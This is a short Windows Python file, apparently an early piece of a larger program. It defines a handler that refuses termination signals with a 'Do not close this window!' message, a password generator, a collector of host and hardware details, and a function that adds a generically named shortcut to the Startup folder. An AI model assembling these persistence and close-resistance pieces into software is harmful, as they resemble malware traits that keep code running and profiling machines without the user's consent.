import os
import socket
import string
import random
import psutil
import GPUtil
import winshell
from win32com.client import Dispatch
import signal

TERMINATION_SIGNALS = [signal.SIGINT, signal.SIGTERM, signal.SIGABRT]


def signal_handler(signum, frame):
    print(f"Received signal: {signum}, but not terminating")
    print(f"Не закрывай это окно! / Do not close this window!")


def generate_password(length=12):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))


def get_system_info():
    machine_name = socket.gethostname()
    cpu_info = psutil.cpu_freq()
    cpu = f"{psutil.cpu_count(logical=False)} Physical, {psutil.cpu_count(logical=True)} Logical, {cpu_info.max:.2f}MHz Max Frequency"
    gpu = "Not Found"
    gpus = GPUtil.getGPUs()
    if gpus:
        gpu = ", ".join([gpu.name for gpu in gpus])
    return {"machine_name": machine_name, "cpu": cpu, "gpu": gpu}


def add_to_startup(executable_path):
    startup_folder = winshell.startup()
    shortcut_path = os.path.join(startup_folder, "MyAppShortcut.lnk")
    target = executable_path  # This should be the path to your compiled .exe file

    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = os.path.dirname(target)
    shortcut.save()
